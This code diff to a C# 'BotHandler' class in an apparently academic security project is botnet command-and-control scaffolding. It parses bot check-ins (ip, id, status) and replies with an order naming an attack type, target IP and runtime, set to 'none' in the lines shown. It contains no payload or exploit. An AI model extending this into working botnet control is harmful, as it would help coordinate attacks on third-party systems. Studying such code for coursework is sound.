@@ -25,6 +25,11 @@ namespace Coms4507_Project.BotHandling
         private readonly NetworkHandler networkHandler; // All interactions with bots is done through here.
         private List<string> bots; // Used to gather all the bots.
         private string ip;
+
+        // These are attack status stuff.
+        public string attackType = "idle";
+        public string requestType = "status";
+
         public BotHandler(string ip)
         {
             bots = new List<string>();
@@ -33,10 +38,6 @@ namespace Coms4507_Project.BotHandling
             thread.Start();
         }
 
-        private void LoadBotIDs()
-        {
-            // TODO: Take the filePath containing all the bots, load them in and check for status on them (with their last known associated IP address).
-        }
         private void Listener()
         {
             while(true)
@@ -47,14 +48,26 @@ namespace Coms4507_Project.BotHandling
                     Trace.WriteLine("waiting");
                     Dictionary<string, string> message = networkHandler.WaitForMessage();
 
-                    //JObject jData = JsonConvert.DeserializeObject<JObject>(message);
+                    JObject jData = JsonConvert.DeserializeObject<JObject>(message["payload"]);
+                    Trace.WriteLine(jData.ToString());
+                    // All bots provide this information and only respond with their
+                    string ip = jData.GetValue("ip").ToString();
+                    string hostID = jData.GetValue("id").ToString();
+                    string status = jData.GetValue("status").ToString();
 
-                    // All bots provide this information.
-                    //string ip = jData.GetValue("ip").ToString();
-                    //string hostID = jData.GetValue("id").ToString();
-                    //string status = jData.GetValue("status").ToString();
+                    // Build the status JObject here
+                    Dictionary<string, object> data = new Dictionary<string, object>
+                    {
+                        { "request", requestType },
+                        { "attack", "none" },
+                        { "targetIP", "none" },
+                        { "runtime", "*" }
+                    };
+
+
+
                     Trace.WriteLine(message["payload"] + "::" + message["ip"] + "::" + message["port"]);
-                    networkHandler.SendMessage(message["payload"], message["ip"], message["port"]);
+                    networkHandler.SendMessage(JObject.FromObject(data).ToString(), message["ip"], message["port"]);
                 }
                 catch (Exception ex)
                 {
